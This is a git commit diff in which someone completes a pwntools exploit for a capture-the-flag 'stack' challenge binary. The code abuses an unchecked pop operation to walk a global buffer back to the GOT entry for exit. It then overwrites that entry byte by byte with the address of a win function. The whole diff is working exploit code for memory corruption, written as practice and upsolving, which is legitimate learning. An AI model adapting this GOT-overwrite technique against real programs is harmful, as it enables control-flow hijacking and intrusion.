b2d2b4fd167b85a14ac5d4464ef16e2ab976c241
Expressionless <expressionless.dev@gmail.com>
2026-09-16 00:07:32 +0000

    upsolve stack

--- stack/tmpl.py
+++ stack/tmpl.py
@@ -1,18 +1,41 @@
 from pwn import *
-from config import REMOTE_ADDR, REMOTE_PORT
+#from config import REMOTE_ADDR, REMOTE_PORT
 
 REMOTE = 0 # Change to 1 to run the exploit on the remote instance
 
+GDB=False
 e = context.binary = ELF("./chal")
+
+if GDB:
+    context.terminal = ['tmux', 'splitw','-h']
+
+win = e.symbols['win']
+print(f"Win @ {hex(win)}")
+
+got_exit = e.got['exit']
+
+# From nm chal
+stack = 0x00000000004040c0
+
+delta = stack - got_exit
+
+print(f"Delta: {delta}")
 
 if REMOTE:
     p = remote(REMOTE_ADDR, REMOTE_PORT)
 else:
     p = e.process()
+    if GDB:
+        gdb.attach(p, gdbscript="""
+            b main
+            b *0x000000000040158b
+            continue
+        """)
 
 io = r = p # use whichever you like for communication
 
 def push(val): 
+    print(f"Pushing {val}")
     p.sendlineafter(b">",b"1")
     p.sendafter(b">",val);
 
@@ -26,5 +49,13 @@ def print_stack():
 def exit():
     p.sendlineafter(b">",b"4")
 
-push(b"A")
-pop()
+for i in range(delta):
+    pop()
+
+
+for i in p64(win):
+    # 2 byte reads
+    push(bytearray([i]))
+
+exit()
+p.interactive()
